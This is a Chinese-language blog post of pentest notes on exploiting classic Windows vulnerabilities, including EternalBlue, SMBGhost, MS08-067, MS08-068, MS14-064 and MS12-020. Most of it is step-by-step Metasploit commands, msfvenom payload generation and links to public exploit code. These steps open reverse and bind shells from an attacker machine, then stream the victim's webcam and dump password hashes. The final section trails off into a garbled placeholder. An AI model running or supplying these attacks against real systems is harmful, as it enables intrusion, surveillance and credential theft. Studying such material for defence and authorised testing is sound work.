---
title: windows经典漏洞
subtitle:
date: 2024-08-15T09:31:01+08:00
slug: 59
draft:  false
author: 
  name: 东隅
  link:
  email: 735587142
  avatar: 
description:
keywords:
license:
comment: false
weight: 0
tags:
  - 攻防
  - 内网渗透
categories:
  - 攻防
hiddenFromHomePage: false
hiddenFromSearch: false
hiddenFromRss: false
hiddenFromRelated: false
summary:
resources:
  - name: featured-image
    src: featured-image.jpg
  - name: featured-image-preview
    src: featured-image-preview.jpg
toc: true
math: false
lightgallery: false
password:
message:
repost:
  enable: true
  url:

# See details front matter: https://fixit.lruihao.cn/documentation/content-management/introduction/#front-matter


---

<!--more-->

# 永恒之蓝MS17-010

永恒之蓝介绍

永恒之蓝是在Windows的SMB服务处理SMB v1请求时发生的漏洞，这个漏洞导致攻击者在目标系统上可以执行任意代码。通过永恒之蓝漏洞会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。其中漏洞编号为MS17-010，利用多个SMB远程代码执行漏洞，可在无交互的情况下获取系统最高权限，又为远程代码任意执行。



445端口开放，可能存在MS017-010漏洞

```
search ms17-010
> use auxiliary/scanner/smb/smb_ms17_010
>set rhost 192.168.93.133
> set rport 445
> show option
>exploit或者run

 发现永恒之蓝漏洞，开始调用漏洞利用模块按照以下参数来进行攻击
>use exploit/windows/smb/ms17_010_eternalblue
>set rhost 192.168.93.133
>set lhost 192.168.93.132
>set payload windows/x64/meterpreter/reverse_tcp
> exploit
```

```
 1 .捕获桌面：

meterpreter screenshot

2 .监视器打开

meterpreter webcam_stream

kali会自动打开浏览器播放被攻击的电脑摄像头，被攻击的电脑摄像头也会变亮

3.获得用户密码
密码为hash加密值，可以利用在线解密进行破解
meterpreter > hashdump

 4.sysinfo查看系统信息
```





# 永恒之黑 CVE-2020-0796

**简单形成介绍：**

　　该漏洞是Windows10在处理SMB 3.1.1协议的压缩消息时，对头部数据没有做任何安全检查，直接使用，从而引发内存破坏漏洞，达到任意命令执行。

**攻击目标：**

　　漏洞主要攻击端口为445，但也会有其他触发方式如，构造恶意的SMB服务器并通过网页、压缩包、共享目录、OFFICE文档等多种方式传递给目标用户

​    当用户打开恶意文件，无需开启445端口就可以触发漏洞

**影响版本：**

　　通过此漏洞获取到的权限为系统最高权限

　　不影响win7，影响Windows 10 1903之后的各个32位、64位版Windows，包括家用版、专业版、企业版、教育版。
```
　　Windows 10 Version 1903 for 32-bit Systems
　　Windows 10 Version 1903 for x64-based Systems
　　Windows 10 Version 1903 for ARM64-based Systems
　　Windows Server, Version 1903 (Server Core installation)
　　Windows 10 Version 1909 for 32-bit Systems
　　Windows 10 Version 1909 for x64-based Systems
　　Windows 10 Version 1909 for ARM64-based Systems
　　Windows Server, Version 1909 (Server Core installation)
```



 

- 首先判断是否存在漏洞

https://github.com/ly4k/SMBGhost

```python
python scanner.py 192.168.90.100
```

出现 Vulnerable 则表示成功



- 打蓝屏

https://github.com/eerykitty/CVE-2020-0796-PoC

```python
python3 CVE-2020-0796.py 192.168.1.133
```



- 拿shell

https://github.com/chompie1337/SMBGhost_RCE_PoC

1：在KALI系统内下载漏洞利用exp

```
git clonehttps://github.com/chompie1337/SMBGhost_RCE_PoC.git
```

2：使用Msfvenom生成正向连接攻击载荷(木马) 端口为：6666

```
msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=6666 -b '\x00' -i 1 -f python
msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=6666 -b '\x00' -i 1 -f exe
```

> 说明: 
> 1  #-p payload
> 2  #-e 编码方式
> 3  #-i 编码次数
> 4  #-b 在生成的程序中避免出现的值
> 5  #LHOST,LPORT 监听上线的主机IP和端口
> 6  #-f exe 生成EXE格式
> 7 #‘\x00‘转义字符，对应ascall码中为null，因为是二进制文件所以会出现，在python中作为结束的标志，有点相当于%00截断的感觉。

3：用生成的shellcode将工具目录中exploit.py中的这一部分替换掉（buf后的字符串，保留USER_PAYLOAD不变）小诀窍，先整体粘贴复制，然后将buf += 替换为 user_paload，就不用一行一行粘贴了，节省了很多时间。以下是exploit.py替换后的内容：

4 :打开msfconsole监听目标机指定端口[端口：6666]

> 1 msfconsole
> 2 use exploit/multi/handler
> 3 set payload windows/x64/meterpreter/bind_tcp
> 4 set lport 6666            //目标端口
> 5 set rhost 172.18.132.88        //目标机ip
> 6 run

5：运行exploit.py脚本，反弹shell

```
python3 exploit.py -ip 192.168.1.133
```

6：msfconsole已经连接到了目标机进行权限维持





# MS08-067 RCE漏洞

> MS08-067漏洞将会影响除Windows Server 2008 Core以外的所有Windows系统，包括：Windows 2000/XP/Server 2003/Vista/Server 2008的各个版本，甚至还包括测试阶段的Windows 7 Pro-Beta。SMB（server massage block）在windows操作系统中是默认在139/445端口开放的，该协议主要用来共享文件等。基于该协议的漏洞也有不少，当然，ms08067是最有名的一个。

漏洞验证

```
nmap --script=smb-vuln-*.nse --script-args=unsafe=1 192.168.2.139
```

漏洞攻击

```
打开msfconsole，查找该漏洞利用框架
search MS08-067
msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp，然后选择payload

show options
search payload windows/meterpreter
set payload windows/meterpreter/reverse_tcp 
show targets
set  target  xx
set  rhost  192.168.244.138
exploit
```





# MS08-068 NTLM反射

> 在早期的 SMB 重放攻击中, 允许将 Client 请求的数据包重放至 Client 本身, 这就造成了 `MS08-068` 漏洞, 但漏洞在 2008 R2 中已经被修复.
>
> 微软在 Server 系列的系统中默认开启 SMB 签名以防止重放攻击, 而个人系统诸如 Windows 7, Windows 10 则默认关闭签名.

```
SMB 协议中的 NTLM 反射漏洞仅针对 Windows 2000 到 Windows Server 2008
此漏洞允许攻击者将传入的 SMB 连接重定向回它来自的计算机，然后使用受害者自己的凭据访问受害者计算机
https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS08-068
msf > use exploit/windows/smb/smb_relay
msf exploit(smb_relay) > show targets
```





# MS14-064

漏洞影响版本

```
Windows Server 2003
Windows Vista
Windows Server 2008
Windows 7
Windows Server 2008 R2
Windows 8 和 Windows 8.1
Windows Server 2012 和 Windows Server 2012 R2
Windows RT 和 Windows RT 8.1
服务器核心安装选项
```



```
use exploit/windows/browser/ms14_064_ole_code_execution
set AllowPowershellPrompt true
set lhost 192.168.109.128
exploit

```

打开win7的ie浏览器，访问这个恶意url

可以看到在kali的msfconsole里面成功收到会话

# MS12-020 DoS/蓝屏/RCE漏洞

1、靶机具有MS12_020漏洞，windows2003、windows2008

2、靶机开启3389端口

```
search ms12-020
pei'zhi'yi
```











